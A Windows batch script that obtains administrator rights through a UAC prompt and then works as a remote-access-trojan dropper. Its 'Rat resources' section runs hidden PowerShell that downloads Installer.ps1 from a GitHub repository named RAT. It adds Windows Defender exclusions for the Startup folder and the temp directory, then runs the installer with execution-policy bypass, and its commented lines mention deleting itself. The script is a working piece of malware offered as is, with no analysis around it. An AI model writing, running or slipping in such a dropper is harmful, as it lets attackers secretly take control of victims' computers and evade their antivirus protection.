@echo off
:: BatchGotAdmin
:: file that gives us admin priv to run and install other files

REM ============================================
REM Check for administrative privileges
REM ============================================

>nul 2>&1 "%SYSTEMROOT%\System32\icacls.exe" "%SYSTEMROOT%\System32\config\system"

IF %ERRORLEVEL% NEQ 0 (
    echo Requesting administrative privileges...
    goto UACPrompt
) ELSE (
    goto gotAdmin
)

REM ============================================
REM UAC Elevation via PowerShell
REM ============================================

:UACPrompt
powershell -NoProfile -Command ^
    "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb RunAs"
exit /B

REM ============================================
REM Running as administrator
REM ============================================

:gotAdmin
pushd "%CD%"
CD /D "%~dp0"

REM ---- your admin-only code goes below here ----
echo Running with administrative privileges.



REM Rat resources
@REM powershell -Command "Set-ExecutionPolicy RemoteSigned -Scope LocalMachine -Force"
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/Installer.ps1 -OutFile Installer.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; Add-MpPreference -ExclusionPath "$env:temp"
powershell powershell.exe -windowstyle hidden -ep bypass ./Installer.ps1
@REM self delete
@REM del wget.cmd